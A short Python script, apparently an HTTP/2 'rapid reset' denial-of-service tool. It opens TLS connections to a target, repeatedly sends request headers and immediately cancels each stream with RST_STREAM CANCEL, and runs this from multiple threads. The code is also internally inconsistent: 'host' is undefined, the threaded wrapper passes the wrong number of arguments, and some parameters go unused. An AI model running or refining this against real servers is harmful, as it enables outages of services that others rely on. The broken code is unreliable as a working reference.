import socket as s
import ssl as sl
import threading as th
from h2.connection import H2Connection as H2C
from h2.config import H2Configuration as H2Cfg
from h2.errors import ErrorCodes as EC

def cancel_http2_stream(n, port=443, path='/get'):
    sock = s.create_connection((host, port))
    ctx = sl.create_default_context()
    ctx.set_alpn_protocols(["h2"])
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
    
    assert ssl_sock.selected_alpn_protocol() == "h2"

    conn = H2C(config=H2Cfg(client_side=True))
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    for _ in range(5):
        stream_id = conn.get_next_available_stream_id()
        headers = [(':method', 'GET'), (':authority', host), (':scheme', 'https'), (':path', path)]
        conn.send_headers(stream_id, headers)
        ssl_sock.sendall(conn.data_to_send())

        conn.reset_stream(stream_id, error_code=EC.CANCEL)
        ssl_sock.sendall(conn.data_to_send())

    ssl_sock.close()

def threaded_cancel_http2_stream(M, n, port=443, path='/get'):
    threads = [th.Thread(target=cancel_http2_stream, args=(n, host, port, path)) for _ in range(5)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

threaded_cancel_http2_stream(5, 5)
